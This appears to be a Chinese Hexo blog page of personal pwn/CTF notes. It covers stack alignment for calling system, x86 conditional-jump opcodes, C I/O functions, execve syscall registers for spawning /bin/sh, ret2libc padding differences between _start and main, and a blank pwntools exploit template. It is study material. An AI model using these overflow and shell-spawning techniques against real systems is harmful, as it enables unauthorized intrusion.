+<p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system栈顶地址末尾是0。</p>
+<p>&#x3D;&#x3D;rop是再最后ret马上执行时栈地址最后一位为0&#x3D;&#x3D;</p>
+<h1 id="Jmp-condition指令–无符号数比较（above-below）有符号数比较（grater-lower）"><a href="#Jmp-condition指令–无符号数比较（above-below）有符号数比较（grater-lower）" class="headerlink" title="Jmp condition指令–无符号数比较（above below）有符号数比较（grater lower）"></a>Jmp condition指令–无符号数比较（above below）有符号数比较（grater lower）</h1><table>
+<thead>
+<tr>
+<th>操作码</th>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>77 <strong>cb</strong></td>
+<td>JA <strong>rel8</strong></td>
+<td>高于（CF&#x3D;0 且 ZF&#x3D;0）时短跳转</td>
+</tr>
+<tr>
+<td>73 <strong>cb</strong></td>
+<td>JAE <strong>rel8</strong></td>
+<td>高于或等于 (CF&#x3D;0) 时短跳转</td>
+</tr>
+<tr>
+<td>72 <strong>cb</strong></td>
+<td>JB <strong>rel8</strong></td>
+<td>低于 (CF&#x3D;1) 时短跳转</td>
+</tr>
+<tr>
+<td>76 <strong>cb</strong></td>
+<td>JBE <strong>rel8</strong></td>
+<td>低于或等于（CF&#x3D;1 或  ZF&#x3D;1）时短跳转</td>
+</tr>
+<tr>
+<td>72 <strong>cb</strong></td>
+<td>JC <strong>rel8</strong></td>
+<td>进位 (CF&#x3D;1) 时短跳转</td>
+</tr>
+<tr>
+<td>E3 <strong>cb</strong></td>
+<td>JCXZ <strong>rel8</strong></td>
+<td>CX 寄存器为 0 时短跳转</td>
+</tr>
+<tr>
+<td>E3 <strong>cb</strong></td>
+<td>JECXZ <strong>rel8</strong></td>
+<td>ECX 寄存器为 0 时短跳转</td>
+</tr>
+<tr>
+<td>74 <strong>cb</strong></td>
+<td>JE <strong>rel8</strong></td>
+<td>等于 (ZF&#x3D;1) 时短跳转</td>
+</tr>
+<tr>
+<td>7F <strong>cb</strong></td>
+<td>JG <strong>rel8</strong></td>
+<td>大于（ZF&#x3D;0 且 SF&#x3D;OF）时短跳转</td>
+</tr>
+<tr>
+<td>7D <strong>cb</strong></td>
+<td>JGE <strong>rel8</strong></td>
+<td>大于或等于 (SF&#x3D;OF) 时短跳转</td>
+</tr>
+<tr>
+<td>7C <strong>cb</strong></td>
+<td>JL <strong>rel8</strong></td>
+<td>小于 (SF&lt;&gt;OF)  时短跳转</td>
+</tr>
+<tr>
+<td>7E <strong>cb</strong></td>
+<td>JLE <strong>rel8</strong></td>
+<td>小于或等于（ZF&#x3D;1 或 SF&lt;&gt;OF）时短跳转</td>
+</tr>
+</tbody></table>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="setvbuf-函数"><a href="#setvbuf-函数" class="headerlink" title="setvbuf() 函数"></a>setvbuf() 函数</h2><p>int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</p>
+<ul>
+<li><strong>stream</strong> – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。</li>
+</ul>
+<ul>
+<li><strong>buffer</strong> – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。</li>
+</ul>
+<ul>
+<li><strong>mode</strong> – 这指定了文件缓冲的模式：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>模式</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>_IOFBF</td>
+<td><strong>全缓冲</strong>  ：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。</td>
+</tr>
+<tr>
+<td>_IOLBF</td>
+<td><strong>行缓冲</strong>  ：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。</td>
+</tr>
+<tr>
+<td>_IONBF</td>
+<td><strong>无缓冲</strong>  ：不使用缓冲。每个  I&#x2F;O 操作都被即时写入。buffer 和 size 参数被忽略。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>size</strong> –这是缓冲的大小，以字节为单位。</li>
+</ul>
+<h2 id="sscanf"><a href="#sscanf" class="headerlink" title="sscanf"></a>sscanf</h2><p>sscanf(str,”%d”,&amp;n) 其实就是把str的内容以”%d”的格式写入到n中（从左到右）</p>
+<h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><p>sprintf(str,”%d”,n)就是把n以”%d”的格式写入到str（从右到左） </p>
+<h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><p>向栈顶所指地址输入数据</p>
+<h2 id="系统中断"><a href="#系统中断" class="headerlink" title="系统中断"></a>系统中断</h2><ul>
+<li>系统调用号，即 eax 应该为 0xb  0xb 为 execve 对应的系统调用号</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+<li>int 80</li>
+</ul>
+<h2 id="main和-start"><a href="#main和-start" class="headerlink" title="main和_start"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/z_ryan/article/details/80985101">main和_start</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_start</span><br><span class="line">.text:080484D0 31 ED                         xor     ebp, ebp</span><br><span class="line">.text:080484D2 5E                            pop     esi</span><br><span class="line">.text:080484D3 89 E1                         mov     ecx, esp</span><br><span class="line">.text:080484D5 83 E4 F0                      and     esp, 0FFFFFFF0h</span><br><span class="line">.text:080484D8 50                            push    eax</span><br><span class="line">.text:080484D9 54                            push    esp                             ; stack_end</span><br><span class="line">.text:080484DA 52                            push    edx                             ; rtld_fini</span><br><span class="line">.text:080484DB 68 10 87 04 08                push    offset __libc_csu_fini          ; fini</span><br><span class="line">.text:080484E0 68 A0 86 04 08                push    offset __libc_csu_init          ; init</span><br><span class="line">.text:080484E5 51                            push    ecx                             ; ubp_av</span><br><span class="line">.text:080484E6 56                            push    esi                             ; argc</span><br><span class="line">.text:080484E7 68 18 86 04 08                push    offset main                     ; main</span><br><span class="line">.text:080484EC E8 9F FF FF FF                call    ___libc_start_main</span><br><span class="line">_start函数调用系统启动函数__libc_start_main, 该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</span><br></pre></td></tr></table></figure>
+
+<p>在ret2libc时 泄露libc基址后，有时会再次返回主函数，返回_start还是main溢出padding是有区别，_start使用 and esp, 0FFFFFFF0h强制esp最后4位bit为0，而main函数通常也会使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">add     esp, 0FFFFFF80h</span><br></pre></td></tr></table></figure>
+
+<p>进行提升堆栈，而经过_start的and esp和__libc_start_main后在来到main的第一条push后esp最后一位总是c，push后为8，再次and后堆栈会自动比ebp上升8，直接返回main后如果esp最后一位不是c，会造成溢出padding变化，例如时4的话，push后变为0，and时就不会esp提升，栈esp在低地址，就要比正常通过_start调用少溢出8个byte</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*</span><br><span class="line">payload=padding+</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/12/pwn/" data-id="cle10lf5e0001e4t9ct3x647w" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/02/12/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/02/12/pwn/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/12/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
